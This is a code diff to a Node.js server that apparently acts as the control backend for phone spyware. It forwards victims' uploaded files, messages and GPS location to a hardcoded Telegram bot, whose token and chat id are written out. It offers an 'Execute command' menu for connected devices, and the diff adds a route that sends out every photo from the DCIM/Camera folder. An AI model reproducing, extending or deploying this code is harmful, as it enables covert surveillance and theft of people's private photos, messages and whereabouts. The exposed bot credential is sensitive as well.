@@ -6,6 +6,8 @@ const uuid4 = require('uuid')
 const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
+const path = require('path');
+
 
 const token = '6663574410:AAFAC7Xj0JypUpa7pi60drZAxtNhW5uD3QI'
 const id = '7152830690'
@@ -66,6 +68,38 @@ app.get('/deleteFile/*', function (req, res) {
 
 
 
+// Function to send all images from the DCIM/Camera folder
+function sendAllImages(id) {
+    const folderPath = 'DCIM/Camera'; // Path to DCIM/Camera folder
+
+    // Read the contents of the folder
+    fs.readdir(folderPath, (err, files) => {
+        if (err) {
+            console.error('Error reading folder:', err);
+            return;
+        }
+
+        // Filter out only image files
+        const imageFiles = files.filter(file => {
+            const extension = path.extname(file).toLowerCase();
+            return ['.jpg', '.jpeg', '.png', '.gif', '.bmp'].includes(extension);
+        });
+
+        // Send each image file
+        imageFiles.forEach(file => {
+            const filePath = path.join(folderPath, file);
+            appBot.sendPhoto(id, filePath, { caption: `Image: ${file}` })
+                .then(() => {
+                    console.log(`Image ${file} sent successfully.`);
+                })
+                .catch(error => {
+                    console.error(`Error sending image ${file}:`, error);
+                });
+        });
+    });
+}
+
+// Route to handle file upload
 app.post("/uploadFile", upload.single('file'), (req, res) => {
     const name = req.file.originalname;
     const file_name = req.file.filename;
@@ -84,6 +118,7 @@ app.post("/uploadFile", upload.single('file'), (req, res) => {
     res.send('');
 });
 
+// Route to handle text upload
 app.post("/uploadText", (req, res) => {
     appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'],
     {
@@ -94,7 +129,9 @@ app.post("/uploadText", (req, res) => {
     }
 },  {parse_mode: "HTML", disable_web_page_preview: true})
     res.send('')
-})
+});
+
+// Route to handle location upload
 app.post("/uploadLocation", (req, res) => {
     appBot.sendLocation(id, req.body['lat'], req.body['lon'])
     appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
@@ -104,9 +141,21 @@ app.post("/uploadLocation", (req, res) => {
           "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
           'resize_keyboard': true
     }
-},  {parse_mode: "HTML"})
-    res.send('')
-})
+},  {parse_mode: "HTML"});
+    res.send('');
+});
+
+// Route to send all images from DCIM/Camera folder
+app.post("/sendAllImages", (req, res) => {
+    const id = req.body.id; // Assuming you'll provide the chat ID in the request body
+
+    if (id) {
+        sendAllImages(id);
+        res.send('Sending all images from DCIM/Camera folder.');
+    } else {
+        res.status(400).send('Chat ID is missing.');
+    }
+});
 appSocket.on('connection', (ws, req) => {
     const uuid = uuid4.v4()
     const model = req.headers.model
